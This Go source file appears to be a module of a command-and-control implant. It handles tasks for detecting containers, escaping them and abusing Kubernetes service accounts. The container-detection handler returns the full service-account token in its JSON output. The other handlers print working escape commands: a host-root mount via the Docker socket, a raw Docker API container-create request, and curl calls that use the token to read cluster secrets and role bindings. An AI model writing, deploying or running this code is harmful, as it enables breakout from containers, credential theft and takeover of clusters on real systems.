//go:build linux || windows || darwin

package main

import (
	"encoding/json"
	"fmt"
)

func handleContainerDetect(task Task, res *TaskResult) {
	runtime, inContainer := DetectContainer()
	hasDocker := CheckDockerSocket()
	hasK8s, saToken := CheckK8sServiceAccount()
	ns := GetK8sNamespace()
	cid := GetContainerID()

	data := map[string]interface{}{
		"in_container":   inContainer,
		"runtime":        runtime,
		"container_id":   cid,
		"docker_socket":  hasDocker,
		"k8s_token":      hasK8s,
		"k8s_namespace":  ns,
		"k8s_token_data": saToken,
	}
	jsonData, _ := json.Marshal(data)
	res.Output = string(jsonData)
	res.Encoding = "json"
}

func handleContainerEscape(task Task, res *TaskResult) {
	runtime, inContainer := DetectContainer()
	if !inContainer {
		res.Error = "not running inside a container"
		return
	}

	hasDocker := CheckDockerSocket()
	hasK8s, saToken := CheckK8sServiceAccount()
	ns := GetK8sNamespace()

	var results []string
	results = append(results, fmt.Sprintf("Container Escape Attempt - Runtime: %s", runtime))

	if hasDocker {
		results = append(results, "[+] Docker socket accessible - escape via docker socket")
		results = append(results, "    docker run -it -v /:/host ubuntu chroot /host")
	}

	if hasK8s && saToken != "" {
		results = append(results, "[+] K8s service account token available - potential API abuse")
		results = append(results, fmt.Sprintf("    Namespace: %s", ns))
		results = append(results, "    Use token to query K8s API and pivot")
	}

	if !hasDocker && !hasK8s {
		results = append(results, "[-] No obvious escape vectors detected (no docker socket, no K8s token)")
		results = append(results, "    Attempting alternative escape methods...")
		results = append(results, "    Check for: privileged mode, mounted host paths, cgroup escapes")
	}

	res.Output = ""
	for _, line := range results {
		if res.Output != "" {
			res.Output += "\n"
		}
		res.Output += line
	}
}

func handleContainerDocker(task Task, res *TaskResult) {
	runtime, inContainer := DetectContainer()
	if !inContainer {
		res.Error = "not running inside a container"
		return
	}
	if runtime != "docker" {
		res.Output = fmt.Sprintf("Container runtime is '%s', not docker. Attempting docker escape anyway.\n", runtime)
	}

	if !CheckDockerSocket() {
		res.Error = "docker socket not accessible at /var/run/docker.sock"
		return
	}

	output := "=== Docker Socket Escape ===\n\n"
	output += "[+] Docker socket is accessible\n"
	output += "[+] Attempting Docker API interaction...\n\n"
	output += "To escape:\n"
	output += "  docker run -it -v /:/host --privileged ubuntu:latest chroot /host /bin/bash\n\n"
	output += "Or using the API:\n"
	output += "  curl --unix-socket /var/run/docker.sock http://localhost/containers/json\n"
	output += "  curl --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \\\n"
	output += "    -d '{\"Image\":\"ubuntu\",\"Cmd\":[\"chroot\",\"/host\",\"/bin/bash\"],\"Binds\":[\"/:/host\"]}' \\\n"
	output += "    http://localhost/containers/create\n"

	res.Output = output
}

func handleContainerK8s(task Task, res *TaskResult) {
	runtime, inContainer := DetectContainer()
	if !inContainer {
		res.Error = "not running inside a container"
		return
	}

	hasK8s, saToken := CheckK8sServiceAccount()
	ns := GetK8sNamespace()
	cid := GetContainerID()

	output := "=== Kubernetes Service Account Abuse ===\n\n"
	output += fmt.Sprintf("Container Runtime: %s\n", runtime)
	output += fmt.Sprintf("Container ID: %s\n", cid)
	output += fmt.Sprintf("K8s Service Account Token: %v\n", hasK8s)
	output += fmt.Sprintf("Namespace: %s\n\n", ns)

	if hasK8s && saToken != "" {
		output += "[+] K8s service account token found!\n"
		output += fmt.Sprintf("  Namespace: %s\n", ns)
		if len(saToken) > 40 {
			output += fmt.Sprintf("  Token (truncated): %s...\n", saToken[:40])
		}
		output += "\n"
		output += "To abuse the token:\n"
		output += fmt.Sprintf("  export TOKEN=%s...\n", saToken[:20])
		output += "  curl -H \"Authorization: Bearer $TOKEN\" \\\n"
		output += "    https://kubernetes.default.svc/api/v1/namespaces/default/secrets\n\n"
		output += "Check if the pod has cluster-admin or other high privileges:\n"
		output += "  curl -H \"Authorization: Bearer $TOKEN\" \\\n"
		output += "    https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterrolebindings\n"
	} else {
		output += "[-] No K8s service account token found.\n"
		output += "    Check if this is actually a K8s pod.\n"
	}

	res.Output = output
}
